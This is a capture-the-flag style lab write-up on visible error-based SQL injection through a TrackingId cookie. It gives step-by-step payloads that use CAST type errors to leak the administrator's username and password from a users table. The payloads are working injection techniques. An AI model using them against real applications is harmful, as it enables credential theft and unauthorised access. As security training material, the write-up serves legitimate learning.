Visible error-based SQL injection

This lab contains a SQL injection vulnerability.
The application uses a tracking cookie for analytics,
and performs a SQL query containing the value of the submitted cookie.

## The target we will need to focus is TrackID 

End Goals :
* Exploit SQLi , Leak the username & password .
* Login as the administrator user .
-----------------------------------------------------------------
Analysis :
1- test that parameters is vulnerable .
# Intercept
open the burp suite catch request and send it to repeater to test possible SQL injections .
TrackingId=MTHshxABbU9laks5' > 500 Internal Error
TrackingId=MTHshxABbU9laks5'-- > 200 OK
" Confirm that no longer receive an error "

2 -  use SELECT , CAST the returned value to an `int` data type:
trackingId=MTHshxABbU9laks5' AND CAST ((SELECT 1) AS int)--
- error saying that an `AND` condition must be a boolean

3 - Modify the condition, you can simply add a comparison operator (`1=`):
TrackingId=MTHshxABbU9laks5' AND 1=CAST((SELECT 1) AS int)--
- '  valid query  '

## Try to output information from DB:
- " from error output "

4 - The lab give us the table ‘users’ we'll use it 
trackingId=MTHshxABbU9laks5' AND 1=CAST((SELECT username FROM users) AS int )--
## Error : Maximum number of characterso, lets delete the cookie value and see what happen
- new error : more than one row returned

5 - Since too many rows are returned, we can limit it to only 1 username . 
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
- The error message now shows us the username ‘administrator’

6 - now lets try it with password and see if he give us the pass also or not :)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
- yes he did , Leaked the password also.
